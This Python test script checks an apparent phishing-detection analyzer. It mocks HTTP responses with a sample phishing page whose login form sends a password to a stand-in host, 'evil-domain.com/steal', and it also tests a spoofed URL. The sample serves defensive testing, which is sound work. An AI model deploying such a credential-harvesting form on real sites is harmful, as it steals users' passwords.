import sys
import os

# Add the parent directory to sys.path to allow 'backend' module import
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from backend.analyzer import analyze_website

def run_tests():
    print("Testing Safe URL (Google):")
    pred, prob, feat = analyze_website("https://google.com")
    print(f"Prediction: {pred}, Probability: {prob}%")
    print("Features:", feat)
    print("\n-------------------\n")
    
    # Let's create a local HTML file with a mock phishing page
    test_html_path = os.path.join(os.path.dirname(__file__), "test_phishing.html")
    with open(test_html_path, "w") as f:
        f.write('''
        <html>
            <title>Verify Your Account</title>
            <body>
                Please login to update payment info.
                <form action="http://evil-domain.com/steal">
                    <input type="password" name="pwd">
                </form>
            </body>
        </html>
        ''')
    
    # We will test using file:// URL if possible, but requests doesn't support file:// URLs directly.
    # Instead, let's just test a hypothetical phishing-looking URL. We can't easily fetch our local file via requests 
    # without starting a local server.
    # Let's mock the text parsing part by temporarily overriding requests.get in the analyzer for the test
    import requests
    class MockResponse:
        def __init__(self, text):
            self.text = text
            self.status_code = 200
            
    def mock_get(*args, **kwargs):
        return MockResponse('''
        <html>
            <title>Verify Your Account</title>
            <body>
                Please login to update payment info.
                <form action="http://evil-domain.com/steal">
                    <input type="password" name="pwd">
                </form>
            </body>
        </html>
        ''')
        
    original_get = requests.get
    requests.get = mock_get
    
    print("Testing Mock Phishing Page (Spoofed URL):")
    # A long URL with IP and no https
    pred, prob, feat = analyze_website("http://192.168.1.1.evil-domain.com/login/verify/update?token=123456789012345678901234567890")
    print(f"Prediction: {pred}, Probability: {prob}%")
    print("Features:", feat)
    
    requests.get = original_get

if __name__ == "__main__":
    run_tests()
